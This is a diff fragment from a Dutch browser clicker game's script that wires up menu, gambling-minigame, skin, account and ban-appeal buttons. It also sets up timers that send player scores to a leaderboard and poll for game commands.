+          G.score -= KEYBIND2_UNLOCK_COST; G.lost += KEYBIND2_UNLOCK_COST; G.unlockedKeybind2 = true; showNotice("Tweede keybind ontgrendeld!", "var(--accent2)"); updateScore(); return;
+        }
+        if (waitingForKey2) { waitingForKey2 = false; keybind2Btn.innerText = G.keybind2Display || "—"; return; }
+        if (G.score < KEYBIND_CHANGE_COST) { showNotice("Je hebt " + fmtMain(KEYBIND_CHANGE_COST) + " Lantings nodig", "var(--danger)"); return; }
+        waitingForKey2 = true; keybind2Btn.innerText = "Druk een toets..."; showNotice("Druk nu een toets in voor keybind 2", "var(--accent2)");
+      });
+      $("fakeMagisterKeybindBtn").addEventListener("click", () => {
+        if (waitingForKey3) { waitingForKey3 = false; $("fakeMagisterKeybindBtn").innerText = G.fakeMagisterKeybindDisplay || "—"; return; }
+        waitingForKey3 = true; $("fakeMagisterKeybindBtn").innerText = "Druk een toets..."; showNotice("Druk nu een toets in voor Fake Magister keybind", "var(--accent2)");
+      });
+      lbExpandBtn.addEventListener("click", () => lbModalOpen ? closeLbModal() : openLbModal());
+      $("lbPrevBtn").addEventListener("click", () => { lbVersionView = "2.1"; renderLeaderboard(); });
+      $("lbNextBtn").addEventListener("click", () => { lbVersionView = VERSION; renderLeaderboard(); });
+      $("lbModalClose").addEventListener("click", closeLbModal);
+      lbModal.addEventListener("click", e => { if (e.target === lbModal) closeLbModal(); });
+      $("shopBtn").addEventListener("click", () => { openOverlay("shopScreen"); renderUnlockTiles(); renderUpgrades(); });
+      $("shopExitBtn").addEventListener("mousedown", () => closeOverlay("shopScreen"));
+      $("gambleBtn").addEventListener("click", () => { if (G.unlockedGamble) openOverlay("gambleScreen"); });
+      $("gambleExitBtn").addEventListener("click", () => closeOverlay("gambleScreen"));
+      $("openBlackjackBtn").addEventListener("click", () => { if (!G.unlockedBlackjack) return; closeOverlay("gambleScreen"); openOverlay("blackjackScreen"); updateBJDisplay(); });
+      $("bjExitBtn").addEventListener("click", () => closeOverlay("blackjackScreen"));
+      $("bjStartBtn").addEventListener("click", () => startBlackjack());
+      $("bjMinBtn").addEventListener("click", () => setInputToMinBet("betInput"));
+      $("bjAllInBtn").addEventListener("click", () => { $("betInput").value = G.score; startBlackjack(); });
+      $("openRollsBtn").addEventListener("click", () => { if (!G.unlockedRolls) return; closeOverlay("gambleScreen"); openOverlay("rollsScreen"); });
+      $("rollsExitBtn").addEventListener("click", () => closeOverlay("rollsScreen"));
+      $("rollPlayBtn").addEventListener("click", () => playRolls());
+      $("rollMinBtn").addEventListener("click", () => setInputToMinBet("rollBet"));
+      $("rollAllBtn").addEventListener("click", () => playRolls({ allIn: true, bet: G.score }));
+      $("rollCount").addEventListener("input", e => { $("rollCountVal").innerText = e.target.value; });
+      $("openMinesBtn").addEventListener("click", () => { if (!G.unlockedMines) return; closeOverlay("gambleScreen"); openOverlay("minesScreen"); });
+      $("minesExitBtn").addEventListener("click", () => closeOverlay("minesScreen"));
+      $("minesStartBtn").addEventListener("click", () => startMinesGame());
+      $("minesMinBtn").addEventListener("click", () => setInputToMinBet("minesBet"));
+      $("minesAllInBtn").addEventListener("click", () => startMinesGame({ allIn: true, bet: G.score }));
+      $("minesCashoutBtn").addEventListener("click", cashoutMines);
+      $("skinBtn").addEventListener("click", () => { openOverlay("skinScreen"); renderSkins(); });
+      $("skinExitBtn").addEventListener("click", () => closeOverlay("skinScreen"));
+      $("statsBtn").addEventListener("click", () => { openOverlay("statsScreen"); updateKeybindUI(); });
+      $("statsExitBtn").addEventListener("click", () => closeOverlay("statsScreen"));
+      $("achBtn").addEventListener("click", () => { openOverlay("achScreen"); renderAchScreen(); });
+      $("achExitBtn").addEventListener("click", () => closeOverlay("achScreen"));
+      $("codeSubmitBtn").addEventListener("click", submitCode);
+      $("codeInput").addEventListener("keydown", e => { if (e.key === "Enter") submitCode(); });
+      $("nameChangeBtn").addEventListener("click", changeNameInSettings);
+      $("nameChangeInput").addEventListener("keydown", e => { if (e.key === "Enter") changeNameInSettings(); });
+      $("voteBtn").addEventListener("click", openVotePanel);
+      $("voteCloseBtn").addEventListener("click", () => closeOverlay("votePanel"));
+      $("voteSubmitBtn").addEventListener("click", submitVote);
+      $("votePanel").addEventListener("click", e => { if (e.target === $("votePanel")) closeOverlay("votePanel"); });
+      suggBtn.addEventListener("click", () => {
+        const rem = 180000 - (Date.now() - lastSuggTime);
+        if (lastSuggTime > 0 && rem > 0) { showNotice("Cooldown actief, wacht tot je opnieuw een suggestie kunt sturen.", "var(--danger)"); return; }
+        openOverlay("suggestionPanel");
+      });
+      $("suggestionCloseBtn").addEventListener("click", () => closeOverlay("suggestionPanel"));
+      $("sendSuggestionBtn").addEventListener("click", sendSuggestion);
+      $("suggestionInput").addEventListener("keydown", e => { if (e.key === "Enter") sendSuggestion(); });
+      $("openAccountsBtn").addEventListener("click", () => { renderAccountsPanel(); openOverlay("accountsPanel"); });
+      $("closeAccountsBtn").addEventListener("click", () => closeOverlay("accountsPanel"));
+      $("createAccBtn").addEventListener("click", createNewAccount);
+      $("newAccName").addEventListener("keydown", e => { if (e.key === "Enter") createNewAccount(); });
+      $("accountsPanel").addEventListener("click", e => { if (e.target === $("accountsPanel")) closeOverlay("accountsPanel"); });
+      document.querySelectorAll(".theme-btn").forEach(btn => btn.addEventListener("click", () => setTheme(btn.dataset.theme)));
+      cpsToggle.addEventListener("change", () => { cpsShowEnabled = cpsToggle.checked; localStorage.setItem(CPS_SHOW_KEY, cpsShowEnabled ? "true" : "false"); updateCpsDisplay(); });
+      $("sendAppealBtn").addEventListener("click", () => {
+        const name = $("appealName").value.trim(), txt = $("appealText").value.trim();
+        if (!name || !txt) { showNotice("Vul beide velden in", "var(--danger)"); return; }
+        sendWH(WH.logs, `📩 BAN APPEAL
+Naam: ${name}
+Bericht: ${txt}`);
+        showNotice("Appeal verstuurd!", "var(--accent2)"); $("appealName").value = ""; $("appealText").value = "";
+      });
+      window.addEventListener("beforeunload", () => { saveActive(); navigator.sendBeacon(WH.main, new Blob([JSON.stringify({ content: "client disconnected: " + G.name })], { type: "application/json" })); });
+
+      // ── INTERVALS ─────────────────────────────────────────────────────────────────
+      setInterval(() => {
+        G.playTime++; const ps = Date.now() < boosts.ps ? cl(G.perSecond * 2.5) : G.perSecond;
+        G.score += ps; G.earned += ps; updateScore();
+      }, 2000);
+
+      // Score + Firebase every second
+      setInterval(() => {
+        if (G.name && $("startScreen").style.display === "none") {
+          sendWH(WH.score, `${G.name} (ID:${G.uid}): ${fmtMain(G.score)}`);
+          pushScoreToFirebase(G.name, G.uid, G.score);
+        }
+      }, 2000);
+
+      // Leaderboard fetch every second
+      setInterval(async () => { await fetchLeaderboard(); renderLeaderboard(); }, 2000);
+
+      setInterval(() => {
+        if (!fallingActive && Date.now() >= nextFallAt && $("startScreen").style.display === "none") {
+          if (Math.random() < 0.20) spawnFallingCircle(); else nextFallAt = Date.now() + 60000;
+        }
+        renderBoosts(); applyEquippedSkin(); updateCpsDisplay(); updateSuggBtn(); checkAnticheat();
+        // Update skin cooldown display if skins screen is open
+        if (activeOverlays.has("skinScreen")) { const cdLeft = getSkinCDLeft(); const cdInfo = $("skinCooldownInfo"); if (cdLeft > 0) { const m = Math.ceil(cdLeft / 60000), s = Math.ceil((cdLeft % 60000) / 1000); cdInfo.innerText = `Skin wissel cooldown: nog ${m}m ${s}s.`; } else cdInfo.innerText = "Je kunt van skin wisselen."; }
+      }, 2000);
+
+      // Remote commands every 2 seconds
+      setInterval(pollRemoteCommands, 2000);
+
+      // ── INIT ──────────────────────────────────────────────────────────────────────
+      $("rollCountVal").innerText = $("rollCount").value;
+      applyEquippedSkin(); renderUnlockTiles(); renderUpgrades();
+      updateGambleBtn(); updateKeybindUI(); updateScore(); updateCpsDisplay(); updateSuggBtn();
+      setTheme(currentTheme);
+      document.querySelectorAll(".theme-btn").forEach(b => b.classList.toggle("active", b.dataset.theme === currentTheme));
+      fetchLeaderboard().then(() => renderLeaderboard());
+      pollRemoteCommands();
+
+    })();
   </script>
 </body>
 
